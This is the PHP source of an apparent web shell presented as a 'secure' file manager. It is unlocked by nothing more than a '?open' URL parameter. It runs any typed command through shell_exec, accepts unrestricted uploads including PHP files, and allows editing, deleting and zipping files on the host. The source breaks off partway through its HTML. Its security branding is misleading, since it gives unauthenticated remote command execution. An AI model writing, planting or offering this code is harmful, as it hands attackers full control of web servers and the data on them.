<?php
/**************************************
 * Modern Premium PHP File Manager v2.0
 * Enhanced Security & Features
 * Compatible with PHP 7.4 to 8.3+
 **************************************/

// === Security Configuration ===
session_start();

// Generate CSRF token
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Rate limiting
$rate_limit_file = sys_get_temp_dir() . '/fm_rate_limit_' . session_id();
$rate_limit = @file_get_contents($rate_limit_file);
$rate_limit_data = $rate_limit ? json_decode($rate_limit, true) : ['count' => 0, 'reset' => time() + 3600];

if ($rate_limit_data['reset'] < time()) {
    $rate_limit_data = ['count' => 0, 'reset' => time() + 3600];
}

if ($rate_limit_data['count'] > 100) {
    http_response_code(429);
    exit("Rate limit exceeded. Try again later.");
}

// === Require query ?open ===
if (!isset($_GET['open'])) {
    http_response_code(403);
    exit("Access blocked");
}

$BASE_START = __DIR__;
$msg = "";
$error = "";
$terminal_output = "";
$current_dir_display = "";

// MAX FILE SIZE (bisa diubah sesuai kebutuhan)
$MAX_FILE_SIZE = 500 * 1024 * 1024; // 500MB

// === Safe realpath function for all PHP versions ===
function safe_real($p) {
    if (empty($p)) return null;
    $r = realpath($p);
    return $r !== false ? $r : null;
}

// === Validate path security ===
function is_path_safe($path, $base) {
    $real_path = safe_real($path);
    $real_base = safe_real($base);
    return $real_path && $real_base && strpos($real_path, $real_base) === 0;
}

// === Get current directory ===
$cwd = isset($_GET['p']) && $_GET['p'] !== '' ? $_GET['p'] : $BASE_START;
$cwd = safe_real($cwd);
if (!$cwd || !is_dir($cwd) || !is_path_safe($cwd, $BASE_START)) {
    $cwd = $BASE_START;
}

// Get current working directory for display
$current_dir_display = $cwd;

// === Enhanced permission helpers ===
function perms_string($path) {
    if (!file_exists($path)) return '---------';
    $p = fileperms($path);
    
    $info = ($p & 0x4000) ? 'd' : '-';
    $info .= ($p & 0x0100) ? 'r' : '-';
    $info .= ($p & 0x0080) ? 'w' : '-';
    $info .= ($p & 0x0040) ? 'x' : '-';
    $info .= ($p & 0x0020) ? 'r' : '-';
    $info .= ($p & 0x0010) ? 'w' : '-';
    $info .= ($p & 0x0008) ? 'x' : '-';
    $info .= ($p & 0x0004) ? 'r' : '-';
    $info .= ($p & 0x0002) ? 'w' : '-';
    $info .= ($p & 0x0001) ? 'x' : '-';
    
    return $info;
}

function can_edit_file($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $editable = ['txt', 'html', 'htm', 'css', 'js', 'json', 'xml', 'md', 'sql', 'log', 'csv', 'ini', 'conf', 'php', 'phtml'];
    return in_array($ext, $editable);
}

function get_file_icon($filename, $isDir = false) {
    if ($isDir) return 'folder';
    
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => 'code-slash',
        'html' => 'filetype-html',
        'htm' => 'filetype-html',
        'css' => 'filetype-css',
        'js' => 'filetype-js',
        'json' => 'filetype-json',
        'txt' => 'file-text',
        'md' => 'markdown',
        'pdf' => 'file-pdf',
        'doc' => 'file-word',
        'docx' => 'file-word',
        'xls' => 'file-excel',
        'xlsx' => 'file-excel',
        'zip' => 'file-zip',
        'rar' => 'file-zip',
        'tar' => 'file-zip',
        'gz' => 'file-zip',
        'jpg' => 'file-image',
        'jpeg' => 'file-image',
        'png' => 'file-image',
        'gif' => 'file-image',
        'svg' => 'file-image',
        'webp' => 'file-image',
        'mp3' => 'file-music',
        'wav' => 'file-music',
        'mp4' => 'file-play',
        'avi' => 'file-play',
        'sql' => 'database',
        'log' => 'file-text',
        'csv' => 'table',
        'xml' => 'filetype-xml',
        'py' => 'code-slash',
        'rb' => 'code-slash',
        'java' => 'code-slash',
        'c' => 'code-slash',
        'cpp' => 'code-slash',
        'sh' => 'terminal'
    ];
    
    return isset($icons[$ext]) ? $icons[$ext] : 'file-earmark';
}

function format_size($bytes) {
    if ($bytes < 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < 4) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

function get_mime_type($file) {
    if (!file_exists($file) || is_dir($file)) return '';
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $file);
    finfo_close($finfo);
    return $mime;
}

// === Search functionality ===
function search_files($dir, $query, &$results) {
    if (!is_dir($dir)) return;
    
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $path = $dir . '/' . $item;
        if (stripos($item, $query) !== false) {
            $results[] = $path;
        }
        
        if (is_dir($path) && count($results) < 100) {
            search_files($path, $query, $results);
        }
    }
}

// === Bulk operations ===
function bulk_delete($items, $cwd) {
    $deleted = 0;
    foreach ($items as $item) {
        $target = safe_real($cwd . '/' . basename($item));
        if ($target && file_exists($target) && is_path_safe($target, $cwd)) {
            if (is_dir($target)) {
                $files = array_diff(scandir($target), ['.', '..']);
                if (empty($files) && @rmdir($target)) {
                    $deleted++;
                }
            } else {
                if (@unlink($target)) {
                    $deleted++;
                }
            }
        }
    }
    return $deleted;
}

// === Create ZIP archive ===
function create_zip($source, $destination) {
    if (!extension_loaded('zip')) {
        return false;
    }
    
    $zip = new ZipArchive();
    if (!$zip->open($destination, ZipArchive::CREATE)) {
        return false;
    }
    
    $source = realpath($source);
    if (is_dir($source)) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($source),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        
        foreach ($files as $name => $file) {
            if (!$file->isDir()) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($source) + 1);
                $zip->addFile($filePath, $relativePath);
            }
        }
    } else if (is_file($source)) {
        $zip->addFile($source, basename($source));
    }
    
    $zip->close();
    return file_exists($destination);
}

// === Process actions with CSRF protection ===
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    // Verify CSRF token
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        $error = "Invalid security token";
    } else {
        $action = $_POST['action'];
        
        // Update rate limit
        $rate_limit_data['count']++;
        file_put_contents($rate_limit_file, json_encode($rate_limit_data));
        
        // Terminal command with pwd/cwd
        if ($action === 'terminal' && isset($_POST['cmd'])) {
            $cmd = trim($_POST['cmd']);
            
            // Handle 'pwd' or 'cwd' command
            if ($cmd === 'pwd' || $cmd === 'cwd') {
                $terminal_output = "Current directory: " . $cwd;
            } else {
                if ($cmd !== '') {
                    $output = array();
                    $return_var = 0;
                    
                    // Safe command execution
                    if (function_exists('shell_exec') && !in_array('shell_exec', array_map('trim', explode(', ', ini_get('disable_functions'))))) {
                        $full_cmd = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
                        $result = shell_exec($full_cmd);
                        $terminal_output = $result !== null ? $result : "Command executed (no output)";
                    } else {
                        $terminal_output = "shell_exec is disabled on this server";
                    }
                }
            }
        }
        
        // Upload file without restrictions
        if ($action === 'upload' && isset($_FILES['files'])) {
            $files = $_FILES['files'];
            $uploadCount = 0;
            $errors = [];
            
            if (is_array($files['name'])) {
                for ($i = 0; $i < count($files['name']); $i++) {
                    if ($files['error'][$i] === UPLOAD_ERR_OK) {
                        $filename = basename($files['name'][$i]);
                        
                        // Check file size only
                        if ($files['size'][$i] > $MAX_FILE_SIZE) {
                            $errors[] = "$filename exceeds size limit";
                            continue;
                        }
                        
                        // Sanitize filename (keep original as much as possible)
                        $filename = preg_replace('/[\\/:*?"<>|]/', '_', $filename);
                        $target = $cwd . '/' . $filename;
                        
                        // Handle duplicate filenames
                        $counter = 1;
                        $original_name = $filename;
                        while (file_exists($target)) {
                            $name_parts = pathinfo($original_name);
                            $filename = $name_parts['filename'] . '_' . $counter . (isset($name_parts['extension']) ? '.' . $name_parts['extension'] : '');
                            $target = $cwd . '/' . $filename;
                            $counter++;
                        }
                        
                        if (move_uploaded_file($files['tmp_name'][$i], $target)) {
                            $uploadCount++;
                        } else {
                            $errors[] = "Failed to upload $filename";
                        }
                    }
                }
                $msg = "$uploadCount file(s) uploaded successfully";
                if (!empty($errors)) {
                    $error = implode(', ', $errors);
                }
            }
        }
        
        // Create folder
        if ($action === 'mkdir' && !empty($_POST['folder'])) {
            $folderName = preg_replace('/[\\/:*?"<>|]/', '_', trim($_POST['folder']));
            $target = $cwd . '/' . $folderName;
            if (!file_exists($target)) {
                if (@mkdir($target, 0755, true)) {
                    $msg = "Folder '$folderName' created successfully";
                } else {
                    $error = "Failed to create folder";
                }
            } else {
                $error = "Folder already exists";
            }
        }
        
        // Create file
        if ($action === 'mkfile' && !empty($_POST['filename'])) {
            $fileName = preg_replace('/[\\/:*?"<>|]/', '_', trim($_POST['filename']));
            $target = $cwd . '/' . $fileName;
            if (!file_exists($target)) {
                if (file_put_contents($target, "") !== false) {
                    $msg = "File '$fileName' created successfully";
                } else {
                    $error = "Failed to create file";
                }
            } else {
                $error = "File already exists";
            }
        }
        
        // Rename
        if ($action === 'rename' && !empty($_POST['old']) && !empty($_POST['new'])) {
            $old = safe_real($cwd . '/' . $_POST['old']);
            $newName = preg_replace('/[\\/:*?"<>|]/', '_', basename($_POST['new']));
            $new = $cwd . '/' . $newName;
            if ($old && file_exists($old) && is_path_safe($old, $cwd)) {
                if (!file_exists($new)) {
                    if (@rename($old, $new)) {
                        $msg = "Successfully renamed to '$newName'";
                    } else {
                        $error = "Failed to rename";
                    }
                } else {
                    $error = "Name already exists";
                }
            }
        }
        
        // Delete single item
        if ($action === 'delete' && !empty($_POST['target'])) {
            $target = safe_real($cwd . '/' . $_POST['target']);
            if ($target && file_exists($target) && is_path_safe($target, $cwd)) {
                if (is_dir($target)) {
                    if (@rmdir($target)) {
                        $msg = "Folder deleted successfully";
                    } else {
                        $error = "Folder is not empty";
                    }
                } else {
                    if (@unlink($target)) {
                        $msg = "File deleted successfully";
                    } else {
                        $error = "Failed to delete file";
                    }
                }
            }
        }
        
        // Bulk delete
        if ($action === 'bulk_delete' && !empty($_POST['selected_items'])) {
            $items = json_decode($_POST['selected_items'], true);
            if (is_array($items)) {
                $deleted = bulk_delete($items, $cwd);
                $msg = "$deleted item(s) deleted successfully";
            }
        }
        
        // Create ZIP
        if ($action === 'create_zip' && !empty($_POST['zip_items'])) {
            $items = json_decode($_POST['zip_items'], true);
            if (is_array($items) && count($items) > 0) {
                $temp_dir = sys_get_temp_dir();
                $zip_name = 'archive_' . date('Ymd_His') . '.zip';
                $zip_path = $temp_dir . '/' . $zip_name;
                
                $zip = new ZipArchive();
                if ($zip->open($zip_path, ZipArchive::CREATE) === true) {
                    foreach ($items as $item) {
                        $source = safe_real($cwd . '/' . basename($item));
                        if ($source && file_exists($source)) {
                            if (is_dir($source)) {
                                $files = new RecursiveIteratorIterator(
                                    new RecursiveDirectoryIterator($source),
                                    RecursiveIteratorIterator::LEAVES_ONLY
                                );
                                foreach ($files as $file) {
                                    if (!$file->isDir()) {
                                        $relative = substr($file->getRealPath(), strlen($source) + 1);
                                        $zip->addFile($file->getRealPath(), basename($source) . '/' . $relative);
                                    }
                                }
                            } else {
                                $zip->addFile($source, basename($item));
                            }
                        }
                    }
                    $zip->close();
                    
                    header('Content-Type: application/zip');
                    header('Content-Disposition: attachment; filename="' . $zip_name . '"');
                    header('Content-Length: ' . filesize($zip_path));
                    readfile($zip_path);
                    unlink($zip_path);
                    exit;
                }
            }
        }
        
        // Save file
        if ($action === 'save' && !empty($_POST['file']) && isset($_POST['content'])) {
            $file = safe_real($cwd . '/' . $_POST['file']);
            if ($file && is_file($file) && is_writable($file) && is_path_safe($file, $cwd)) {
                if (file_put_contents($file, $_POST['content']) !== false) {
                    $msg = "File saved successfully";
                } else {
                    $error = "Failed to save file";
                }
            }
        }
        
        // Search
        if ($action === 'search' && isset($_POST['search_query'])) {
            $search_query = trim($_POST['search_query']);
            $search_results = [];
            if (strlen($search_query) > 2) {
                search_files($cwd, $search_query, $search_results);
            }
        }
        
        // Change directory via POST
        if ($action === 'cd' && isset($_POST['directory'])) {
            $new_dir = safe_real(trim($_POST['directory']));
            if ($new_dir && is_dir($new_dir) && is_path_safe($new_dir, $BASE_START)) {
                $cwd = $new_dir;
                $current_dir_display = $cwd;
                // Redirect to update the page
                $params = array('open' => '', 'p' => $cwd);
                header("Location: ?" . http_build_query($params));
                exit;
            } else {
                $error = "Invalid directory";
            }
        }
    }
    
    // Redirect for non-download and non-terminal actions
    if ($action !== 'create_zip' && $action !== 'terminal') {
        $params = array('open' => '');
        if ($cwd !== $BASE_START) $params['p'] = $cwd;
        if ($msg) $params['msg'] = $msg;
        if ($error) $params['error'] = $error;
        
        header("Location: ?" . http_build_query($params));
        exit;
    }
}

// === Get edit file ===
$editFile = null;
if (isset($_GET['edit'])) {
    $ep = safe_real($cwd . '/' . $_GET['edit']);
    if ($ep && is_file($ep) && is_readable($ep) && is_path_safe($ep, $cwd)) {
        if (can_edit_file($ep)) {
            $editFile = $ep;
        } else {
            $error = "File type cannot be edited in browser";
        }
    }
}

// === Get directory items ===
$items = scandir($cwd);
$folders = array();
$files = array();

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $fullPath = $cwd . '/' . $item;
    if (is_dir($fullPath)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}

// Sort naturally
natcasesort($folders);
natcasesort($files);
$allItems = array_merge($folders, $files);

// === Breadcrumb ===
function getBreadcrumbs($path, $base) {
    $relative = str_replace($base, '', $path);
    $parts = explode('/', trim($relative, '/'));
    $breadcrumbs = array();
    $accum = $base;
    
    $breadcrumbs[] = array(
        'name' => 'Home',
        'path' => $base
    );
    
    foreach ($parts as $part) {
        if ($part === '') continue;
        $accum .= '/' . $part;
        $breadcrumbs[] = array(
            'name' => $part,
            'path' => $accum
        );
    }
    return $breadcrumbs;
}

// Function to generate path navigation with clickable parts
function get_clickable_path($path, $base) {
    $relative = str_replace($base, '', $path);
    $parts = explode('/', trim($relative, '/'));
    $accum = $base;
    $html = '<span class="current-path-root">' . htmlspecialchars($base) . '</span>';
    
    foreach ($parts as $part) {
        if ($part === '') continue;
        $accum .= '/' . $part;
        $html .= ' / <a href="?open&p=' . urlencode($accum) . '" class="clickable-path">' . htmlspecialchars($part) . '</a>';
    }
    
    return $html;
}

// === Get system info ===
$serverInfo = php_uname('s') . ' ' . php_uname('r');
$phpVersion = 'PHP ' . phpversion();
$diskFree = format_size(disk_free_space($cwd));
$diskTotal = format_size(disk_total_space($cwd));
$diskUsage = round((disk_total_space($cwd) - disk_free_space($cwd)) / disk_total_space($cwd) * 100);

// === Get message from GET ===
if (isset($_GET['msg'])) {
    $msg = $_GET['msg'];
}
if (isset($_GET['error'])) {
    $error = $_GET['error'];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Modern File Manager v2.0</title>
    
    <!-- Bootstrap 5 + Icons -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --secondary: #64748b;
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --dark: #0f172a;
            --light: #f8fafc;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 1.5rem;
            color: var(--dark);
        }

        .glass-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            box-shadow: 0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);
            transition: all 0.3s ease;
        }

        .server-info {
            background: linear-gradient(135deg, #1e293b, #0f172a);
            color: #e2e8f0;
            border-radius: 100px;
            padding: 0.5rem 1.5rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
        }

        .breadcrumb-modern {
            background: rgba(255, 255, 255, 0.5);
            backdrop-filter: blur(4px);
            border-radius: 100px;
            padding: 0.5rem 1.25rem;
        }

        .table-modern {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0 8px;
        }

        .table-modern tbody tr {
            background: white;
            border-radius: 16px;
            transition: all 0.2s;
            cursor: pointer;
        }

        .table-modern tbody tr:hover {
            box-shadow: 0 10px 15px -3px rgb(0 0 0 / 0.1);
            transform: scale(1.01);
        }

        .table-modern tbody td {
            padding: 1rem;
            border: none;
            vertical-align: middle;
        }

        .icon-wrapper {
            width: 40px;
            height: 40px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.25rem;
        }

        .icon-folder {
            background: linear-gradient(135deg, #fbbf24, #f59e0b);
            color: white;
        }

        .icon-file {
            background: linear-gradient(135deg, #94a3b8, #64748b);
            color: white;
        }

        .btn-modern {
            border-radius: 100px !important;
            padding: 0.5rem 1.25rem;
            font-weight: 500;
            transition: all 0.2s;
            border: none;
        }

        .btn-modern-primary {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: white;
        }

        .btn-modern-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 15px -3px rgb(0 0 0 / 0.1);
            color: white;
        }

        .form-control-modern {
            border-radius: 100px !important;
            border: 1px solid #e2e8f0;
            padding: 0.6rem 1.25rem;
        }

        .form-control-modern:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }

        .terminal-box {
            background: #1e293b;
            border-radius: 20px;
            padding: 1.25rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            color: #a5f3fc;
            border: 1px solid #334155;
            margin-top: 1rem;
            max-height: 300px;
            overflow-y: auto;
        }

        .terminal-box pre {
            color: #a5f3fc;
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .progress-bar-custom {
            height: 8px;
            border-radius: 100px;
            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
        }

        .checkbox-select {
            width: 20px;
            height: 20px;
            cursor: pointer;
        }

        .current-dir {
            background: #f1f5f9;
            border-radius: 12px;
            padding: 0.75rem 1rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            word-break: break-all;
        }
        
        .current-dir a {
            color: var(--primary);
            text-decoration: none;
            font-weight: 600;
            transition: all 0.2s;
        }
        
        .current-dir a:hover {
            text-decoration: underline;
            color: var(--primary-dark);
        }
        
        .current-path-root {
            color: var(--secondary);
            font-weight: normal;
        }
        
        .clickable-path {
            color: var(--primary);
            text-decoration: none;
            font-weight: 600;
            cursor: pointer;
        }
        
        .clickable-path:hover {
            text-decoration: underline;
            color: var(--primary-dark);
        }
        
        .directory-input-group {
            margin-top: 0.5rem;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .animate-slide-in {
            animation: slideIn 0.3s ease forwards;
        }

        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: #f1f1f1;
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            border-radius: 10px;
        }

        @media (max-width: 768px) {
            body {
                padding: 0.75rem;
            }
            
            .table-modern tbody td {
                padding: 0.75rem 0.5rem;
            }
            
            .icon-wrapper {
                width: 32px;
                height: 32px;
                font-size: 1rem;
            }
            
            .current-dir {
                font-size: 0.75rem;
                padding: 0.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="container-fluid px-0 px-lg-3">
        <!-- Header -->
        <div class="d-flex flex-column flex-lg-row align-items-start align-items-lg-center justify-content-between gap-3 mb-4">
            <div class="d-flex align-items-center gap-3">
                <div class="icon-wrapper icon-folder" style="width: 48px; height: 48px; font-size: 1.5rem;">
                    <i class="bi bi-folder2-open"></i>
                </div>
                <div>
                    <h1 class="display-6 fw-bold mb-0" style="color: white;">
                        File Manager v2.0
                    </h1>
                    <p class="text-white-50 mt-1 mb-0">
                        <i class="bi bi-shield-check"></i> secure · fast · modern
                    </p>
                </div>
            </div>
            <div class="server-info">
                <i class="bi bi-hdd-stack"></i>
                <span>Free: <?php echo $diskFree; ?> / <?php echo $diskTotal; ?></span>
                <i class="bi bi-dot"></i>
                <i class="bi bi-cpu"></i>
                <span><?php echo htmlspecialchars($serverInfo); ?></span>
            </div>
        </div>

        <!-- Alerts -->
        <?php if ($msg): ?>
        <div class="alert alert-success alert-dismissible fade show animate-slide-in mb-4" role="alert" style="border-radius: 16px;">
            <i class="bi bi-check-circle-fill me-2"></i>
            <?php echo htmlspecialchars($msg); ?>
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        </div>
        <?php endif; ?>

        <?php if ($error): ?>
        <div class="alert alert-danger alert-dismissible fade show animate-slide-in mb-4" role="alert" style="border-radius: 16px;">
            <i class="bi bi-exclamation-triangle-fill me-2"></i>
            <?php echo htmlspecialchars($error); ?>
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        </div>
        <?php endif; ?>

        <!-- Current Directory Display with Clickable Path -->
        <div class="glass-card p-3 mb-4 animate-slide-in">
            <div class="d-flex align-items-center gap-2 mb-2">
                <i class="bi bi-folder-symlink fs-5 text-primary"></i>
                <span class="fw-semibold">Current Directory:</span>
            </div>
            <div class="current-dir">
                <i class="bi bi-folder-fill text-warning me-2"></i>
                <?php echo get_clickable_path($current_dir_display, $BASE_START); ?>
            </div>
            
            <!-- Quick directory jump form -->
            <div class="directory-input-group">
                <form method="post" class="d-flex gap-2">
                    <input type="hidden" name="action" value="cd">
                    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                    <div class="input-group">
                        <span class="input-group-text bg-white">
                            <i class="bi bi-arrow-right-circle"></i>
                        </span>
                        <input type="text" name="directory" class="form-control form-control-modern" 
                               placeholder="Jump to directory (e.g., /home/user/folder)" 
                               value="<?php echo htmlspecialchars($current_dir_display); ?>">
                        <button type="submit" class="btn btn-modern btn-modern-primary">
                            <i class="bi bi-send"></i> Go
                        </button>
                    </div>
                </form>
                <small class="text-muted mt-2 d-block">
                    <i class="bi bi-info-circle"></i> Tip: Click on any folder name in the path above to navigate, or type a path and click Go
                </small>
            </div>
        </div>

        <!-- Disk Usage -->
        <div class="glass-card p-3 mb-4 animate-slide-in">
            <div class="d-flex justify-content-between align-items-center mb-2">
                <small class="text-secondary">Disk Usage</small>
                <small class="text-secondary fw-bold"><?php echo $diskUsage; ?>%</small>
            </div>
            <div class="progress" style="height: 8px; border-radius: 100px;">
                <div class="progress-bar progress-bar-custom" style="width: <?php echo $diskUsage; ?>%"></div>
            </div>
        </div>

        <!-- Main Content -->
        <div class="glass-card p-4 mb-4 animate-slide-in">
            <!-- Breadcrumb & Actions -->
            <div class="row g-3 align-items-center mb-4">
                <div class="col-lg-6">
                    <nav aria-label="breadcrumb" class="breadcrumb-modern">
                        <ol class="breadcrumb mb-0">
                            <?php foreach (getBreadcrumbs($cwd, $BASE_START) as $b): ?>
                            <li class="breadcrumb-item">
                                <a href="?open&p=<?php echo urlencode($b['path']); ?>" class="text-decoration-none">
                                    <?php echo htmlspecialchars($b['name']); ?>
                                </a>
                            </li>
                            <?php endforeach; ?>
                        </ol>
                    </nav>
                </div>
                <div class="col-lg-6">
                    <div class="d-flex flex-wrap gap-2 justify-content-lg-end">
                        <!-- Search -->
                        <form method="post" class="d-flex gap-1">
                            <input type="hidden" name="action" value="search">
                            <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                            <input type="text" name="search_query" class="form-control form-control-modern" 
                                   placeholder="Search files..." style="width: 200px;">
                            <button type="submit" class="btn btn-modern btn-modern-primary">
                                <i class="bi bi-search"></i>
                            </button>
                        </form>

                        <!-- Upload -->
                        <form method="post" enctype="multipart/form-data" class="d-flex gap-1">
                            <input type="hidden" name="action" value="upload">
                            <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                            <input type="file" name="files[]" multiple class="form-control form-control-modern" style="width: 200px;">
                            <button type="submit" class="btn btn-modern btn-modern-primary">
                                <i class="bi bi-cloud-upload"></i>
                            </button>
                        </form>

                        <button type="button" class="btn btn-modern btn-modern-primary" data-bs-toggle="modal" data-bs-target="#newFolderModal">
                            <i class="bi bi-folder-plus"></i>
                        </button>

                        <button type="button" class="btn btn-modern btn-modern-primary" data-bs-toggle="modal" data-bs-target="#newFileModal">
                            <i class="bi bi-file-plus"></i>
                        </button>
                        
                        <button type="button" class="btn btn-modern btn-modern-primary" id="bulkDeleteBtn" style="display: none;">
                            <i class="bi bi-trash"></i> Delete
                        </button>
                        
                        <button type="button" class="btn btn-modern btn-modern-primary" id="bulkZipBtn" style="display: none;">
                            <i class="bi bi-file-zip"></i> Zip
                        </button>
                    </div>
                </div>
            </div>

            <!-- Terminal with pwd/cwd support -->
            <div class="mb-4">
                <div class="d-flex align-items-center gap-2 mb-3">
                    <div class="icon-wrapper icon-file" style="width: 32px; height: 32px;">
                        <i class="bi bi-terminal"></i>
                    </div>
                    <h5 class="fw-semibold mb-0">Terminal</h5>
                    <span class="badge bg-secondary rounded-pill px-3 py-1">
                        <i class="bi bi-folder"></i> <?php echo htmlspecialchars(basename($cwd)); ?>/
                    </span>
                    <small class="text-muted ms-2">
                        <i class="bi bi-info-circle"></i> Try: <kbd>pwd</kbd> or <kbd>ls -la</kbd>
                    </small>
                </div>
                
                <form method="post">
                    <input type="hidden" name="action" value="terminal">
                    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                    <div class="input-group">
                        <span class="input-group-text bg-white border-end-0 rounded-start-pill">
                            <i class="bi bi-chevron-right text-primary"></i>
                        </span>
                        <input type="text" name="cmd" class="form-control form-control-modern border-start-0" 
                               placeholder="Enter command (pwd, ls, etc.)" autocomplete="off">
                        <button type="submit" class="btn btn-modern btn-modern-primary">
                            <i class="bi bi-play-fill"></i> Run
                        </button>
                    </div>
                </form>

                <?php if ($terminal_output !== ""): ?>
                <div class="terminal-box">
                    <pre><?php echo htmlspecialchars($terminal_output); ?></pre>
                </div>
                <?php endif; ?>
            </div>

            <!-- File List -->
            <div>
                <div class="d-flex align-items-center gap-2 mb-3">
                    <div class="icon-wrapper icon-folder" style="width: 32px; height: 32px;">
                        <i class="bi bi-list-ul"></i>
                    </div>
                    <h5 class="fw-semibold mb-0">File Explorer</h5>
                    <span class="badge bg-secondary rounded-pill px-3 py-1">
                        <?php echo count($allItems); ?> items
                    </span>
                    <button class="btn btn-sm btn-link" id="selectAllBtn">
                        <i class="bi bi-check2-square"></i> Select All
                    </button>
                </div>

                <div class="table-responsive">
                    <table class="table-modern">
                        <thead>
                            <tr>
                                <th style="width: 40px;">
                                    <input type="checkbox" id="selectAllCheckbox" class="checkbox-select">
                                </th>
                                <th>Name</th>
                                <th>Type</th>
                                <th>Size</th>
                                <th>Permissions</th>
                                <th>Modified</th>
                                <th class="text-end">Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($allItems as $item): 
                                $fullPath = $cwd . '/' . $item;
                                $isDir = is_dir($fullPath);
                                $icon = get_file_icon($item, $isDir);
                                $perms = perms_string($fullPath);
                                $size = $isDir ? '-' : format_size(filesize($fullPath));
                                $modified = date('d M Y H:i', filemtime($fullPath));
                            ?>
                            <tr data-path="<?php echo htmlspecialchars($fullPath); ?>">
                                <td>
                                    <input type="checkbox" class="item-checkbox checkbox-select" value="<?php echo htmlspecialchars($item); ?>">
                                </td>
                                <td>
                                    <div class="d-flex align-items-center gap-2">
                                        <div class="icon-wrapper <?php echo $isDir ? 'icon-folder' : 'icon-file'; ?>">
                                            <i class="bi bi-<?php echo $icon; ?>"></i>
                                        </div>
                                        <?php if ($isDir): ?>
                                        <a href="?open&p=<?php echo urlencode($fullPath); ?>" class="file-name text-decoration-none fw-semibold">
                                            <?php echo htmlspecialchars($item); ?>
                                        </a>
                                        <?php else: ?>
                                        <span class="file-name fw-semibold"><?php echo htmlspecialchars($item); ?></span>
                                        <?php endif; ?>
                                    </div>
                                </td>
                                <td>
                                    <span class="badge bg-light text-dark rounded-pill px-3 py-1">
                                        <?php echo $isDir ? 'Folder' : strtoupper(pathinfo($item, PATHINFO_EXTENSION) ?: 'File'); ?>
                                    </span>
                                </td>
                                <td class="fw-medium"><?php echo $size; ?></td>
                                <td><code class="text-secondary"><?php echo $perms; ?></code></td>
                                <td class="text-secondary"><?php echo $modified; ?></td>
                                <td class="text-end">
                                    <div class="d-flex gap-1 justify-content-end">
                                        <?php if (!$isDir && can_edit_file($item)): ?>
                                        <a href="?open&p=<?php echo urlencode($cwd); ?>&edit=<?php echo urlencode($item); ?>" 
                                           class="btn btn-sm btn-outline-primary rounded-pill" title="Edit">
                                            <i class="bi bi-pencil"></i>
                                        </a>
                                        <?php endif; ?>
                                        
                                        <button type="button" class="btn btn-sm btn-outline-primary rounded-pill" 
                                                data-bs-toggle="modal" data-bs-target="#renameModal<?php echo md5($item); ?>" 
                                                title="Rename">
                                            <i class="bi bi-pencil-square"></i>
                                        </button>
                                        
                                        <form method="post" class="d-inline" 
                                              onsubmit="return confirm('Delete <?php echo $isDir ? 'folder' : 'file'; ?>?')">
